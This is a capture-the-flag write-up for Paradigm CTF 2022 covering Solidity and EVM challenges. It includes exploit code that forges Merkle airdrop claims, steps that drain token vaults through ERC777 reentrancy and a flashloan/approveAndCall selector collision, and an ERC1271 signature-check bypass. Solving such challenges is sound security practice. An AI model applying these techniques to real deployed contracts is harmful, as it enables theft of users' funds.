# Paradigm CTF 2022

Some challenges are slightly modified to run locally. Using [forge](https://github.com/foundry-rs/foundry) to run scripts.

```bash
forge script script/Random.s.sol
```

**Table of Contents**
- [RANDOM](#random)
- [MERKLEDROP](#merkledrop)
- [RESCUE](#rescue)
- [SOURCECODE](#sourcecode)
- [VANITY](#vanity)
- [HINTFINANCE](#hintfinance)

## Random

simple task. The meme comes from https://youtu.be/LP1t_pzxKyE?t=251

## MerkleDrop

This task requires you to claim all tokens from a merkle airdrop contract without claiming all the valid indices.

```solidity
function claim(uint256 index, address account, uint96 amount, bytes32[] memory merkleProof) external {
    require(!isClaimed(index), 'MerkleDistributor: Drop already claimed.');
    
    // Verify the merkle proof.
    bytes32 node = keccak256(abi.encodePacked(index, account, amount));
    require(MerkleProof.verify(merkleProof, merkleRoot, node), 'MerkleDistributor: Invalid proof.');
    
    // Mark it claimed and send the token.
    _setClaimed(index);
    require(ERC20Like(token).transfer(account, amount), 'MerkleDistributor: Transfer failed.');
    
    emit Claimed(index, account, amount);
}
```

`claim` from `MerkleDistributor`. `amount` is using type `uint96`, the payload for `claim` happens to be
256+160+96=512. This fits two leafs for the merkle proof. We can use the first two from any intermediate state when constructing the merkle proof.

Example of claiming index 0 with intermediate state.

```solidity
function tryIndex0() public {
    bytes32[] memory proofs = new bytes32[](6);
    proofs[0] = 0xa37b8b0377c63d3582581c28a09c10284a03a6c4185dfa5c29e20dbce1a1427a;
    proofs[1] = 0x0ae01ec0f7a50774e0c1ad35f0f5efcc14c376f675704a6212b483bfbf742a69;
    proofs[2] = 0x3f267b524a6acda73b1d3e54777f40b188c66a14a090cd142a7ec48b13422298;
    proofs[3] = 0xe2eae0dabf8d82b313729f55298625b7ac9ba0f12e408529bae4a2ce405e7d5f;
    proofs[4] = 0x01cf774c22de70195c31bde82dc3ec94807e4e4e01a42aca6d5adccafe09510e;
    proofs[5] = 0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5;
    dist.claim(0, 0x00E21E550021Af51258060A0E18148e36607C9df, 0x09906894166afcc878, proofs);

    // claim(uint256 index, address account, uint96 amount, bytes32[] proofs)
    bytes32 node = keccak256(abi.encodePacked(uint256(0), address(0x00E21E550021Af51258060A0E18148e36607C9df), uint96(0x09906894166afcc878)));
    emit log_named_bytes32("node", node);
    // node      = 0xa9e8f0fbf0d2911d746500a7786606d3fc80abb68a05f77fb730ded04a951c2d
    // proofs[0] = 0xa37b8b0377c63d3582581c28a09c10284a03a6c4185dfa5c29e20dbce1a1427a
    bytes32[] memory fakeProofs = new bytes32[](5);
    fakeProofs[0] = proofs[1];
    fakeProofs[1] = proofs[2];
    fakeProofs[2] = proofs[3];
    fakeProofs[3] = proofs[4];
    fakeProofs[4] = proofs[5];
    dist.claim(0xa37b8b0377c63d3582581c28a09c10284a03a6c4185dfa5c29e20dbce1a1427a, 0xa9e8F0FBF0d2911d746500A7786606d3fC80abb6, uint96(0x8a05f77fb730ded04a951c2d), fakeProofs);
}
```

We created a simple [script](src/MerkleDrop/findVictim.js) to test every index of the tree. Only two indices is within the valid range.

```
total: 75000
index:19, fakeAmount: 0x00000f40f0c122ae08d2207b=72033.43704913257, fakeAddr: 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A, fakeIndex: 0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442
index:37, fakeAmount: 0x00000f40f0c122ae08d2207b=72033.43704913257, fakeAddr: 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A, fakeIndex: 0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442
....
index: 8, amount: 2966
....
```

Using index 8 and fake 19/37 will empty the 75000 tokens.

## Rescue

Someone sent WETH to Sushi's MasterChef contract. This task requires us to move the WETH out of the contract.

```solidity
function swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut) external {
    (address lpToken,,,) = masterchef.poolInfo(poolId);
    address tokenOut0 = UniswapV2PairLike(lpToken).token0();
    address tokenOut1 = UniswapV2PairLike(lpToken).token1();

    ERC20Like(tokenIn).approve(address(router), type(uint256).max);
    ERC20Like(tokenOut0).approve(address(router), type(uint256).max);
    ERC20Like(tokenOut1).approve(address(router), type(uint256).max);
    ERC20Like(tokenIn).transferFrom(msg.sender, address(this), amountIn);

    // swap for both tokens of the lp pool
    _swap(tokenIn, tokenOut0, amountIn / 2);
    _swap(tokenIn, tokenOut1, amountIn / 2);

    // add liquidity and give lp tokens to msg.sender
    _addLiquidity(tokenOut0, tokenOut1, minAmountOut);
}

function _addLiquidity(address token0, address token1, uint256 minAmountOut) internal {
    (,, uint256 amountOut) = router.addLiquidity(
        token0, 
        token1, 
        ERC20Like(token0).balanceOf(address(this)), 
        ERC20Like(token1).balanceOf(address(this)), 
        0, 
        0, 
        msg.sender, 
        block.timestamp
    );
    require(amountOut >= minAmountOut);
}
```

The idea is to trigger the `_addLiquidity` function when we call `swapTokenForPoolToken`.

* Buy exact `10 ether` amount of `DAI` and transfer to `MasterChef`
* Call `swapTokenForPoolToken` with any other tokens.
* When `MasterChef` calls router.addLiquidity, it tells the pool to take all its tokens, including the initial 10 WETH and DAI we transferred.

## SourceCode

This task requires you to write a [quine](https://en.wikipedia.org/wiki/Quine_(computing)) in EVM assembly.

A typical way to implement is:

```javascript
s = "; console.log('s =', JSON.stringify(s), s)" ; console.log('s =', JSON.stringify(s), s)
```

Similar way to do this in EVM

```
// Part1
PUSH <Part2 CODE>
// Part2
DUP CODE             # memory: CODE:CODE
PUSH <PUSH>          # memory: PUSH:CODE:CODE
RETURN 
```

with some tweaks on code size, the [solution](https://www.evm.codes/playground?unit=Wei&codeType=Mnemonic&code='v7w806011526000526070600e536023600ef3yDUP1~11z~00z~70~0ez8~23~0eyRETURN'~yvwzyMSTOREy%5Cnw%200xvPUSH1%01vwyz~_) is

```
# ---- code -----------                          -------- stack ------  ----- memory ---------
PUSH17 0x806011526000526070600e536023600ef3      # code
DUP1                                             # code code
PUSH1 17                                         # 17 code code
MSTORE                                           # code                 0000 code
PUSH1 0                                          # 0 code               0000 code
MSTORE                                           #                      0000 code code
PUSH1 112                                        # 112 (PUSH17)
PUSH1 14                                         # 14 112
MSTORE8                                          #                      0000 PUSH17 code code
PUSH1 67                                         # 67
PUSH1 14                                         # 14 67
RETURN                                           # returns "PUSH17 code code"                     
```

`0x806011526000526070600e536023600ef3` is compiled from `DUP1 PUSH1 17 MSTORE PUSH1 0 MSTORE PUSH1 112 PUSH1 14
MSTORE8 PUSH1 67 PUSH1 14 RETURN`.

## Vanity

This task requires to either send transaction from a address or a contract which has at least 20 zeros. 
It's impossible to generate an address like that. The only hope is how the contract verify signatures from
other contracts.

```solidity
function isValidSignatureNow(
        address signer,
        bytes32 hash,
        bytes memory signature
    ) internal view returns (bool) {
        (address recovered, ECDSA.RecoverError error) = ECDSA.tryRecover(hash, signature);
        if (error == ECDSA.RecoverError.NoError && recovered == signer) {
            return true;
        }

        (bool success, bytes memory result) = signer.staticcall(
            abi.encodeWithSelector(IERC1271.isValidSignature.selector, hash, signature)
        );
        return (success && result.length == 32 && abi.decode(result, (bytes4)) == IERC1271.isValidSignature.selector);
}
```

As we can't forge a signature for the signer, we failed at `ECDSA.tryRecover` and then the contract will call `signer`
with `isValidSignature`. To pass the test, we need to get 32 bytes in return and the first 4 bytes should match the signature.

To solve the task, we would use the precompiled `sha256` contract [0x0000000000000000000000000000000000000002](https://etherscan.io/address/0x0000000000000000000000000000000000000002)
as it returns 32 bytes and accept any input. All we need to do now is to match the 4 bytes sig. We write a [script](src/Vanity/mining.go)
to brute force `signature` from the input.

```bash
Found collision: 1626ba7e95fed565f4010ab111eb8825524035addedf763b65bd3d1c8ec4e5cd, rand: 74bddd646a036561
```

## HintFinance

This task setup 3 typical staking vault with real world tokens: [PNT](https://etherscan.io/token/0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD), 
[SAND](https://etherscan.io/token/0x3845badAde8e6dFF049820680d1F14bD3903a5d0), [AMP](https://etherscan.io/token/0xff20817765cb7f73d4bde2e66e067e58d11095c2). 
Then you need to drain all the 3 vaults to less than 1%.

PNT and AMP are both ERC777 tokens which will call `receiver.tokenReceived` when token is transferred. 
There are many exploits with these kind of tokens: [cream](https://rekt.news/cream-rekt/). 
It's an easy task to repeatedly using the reentrancy to re-deposit when withdraw token.

The tricky part is that SAND is not an ERC777 token. The author [reveals](https://twitter.com/rileyholterhus/status/1561656848956108801) 
that he intentionally tried different names on the flash loan hook to have collision with `approveAndCall` from SAND.
```solidity
interface IHintFinanceFlashloanReceiver {
    function onHintFinanceFlashloan(
        address token,
        address factory,
        uint256 amount,
        bool isUnderlyingOrReward,
        bytes memory data
    ) external;
}

interface ISand is ERC20Like {
    function approveAndCall(
        address _target,
        uint256 _amount,
        bytes calldata _data
    ) external;
}
```

* SAND.approveAndCall(VAULT, flashLoanPayload) 
* SAND calls VAULT.flashloan(flashLoanPayload)
* VAULT calls SAND.onHintFinanceFlashloan => SAND.approveAndCall
* VAULT approves all SAND to our contract now







  
  
  
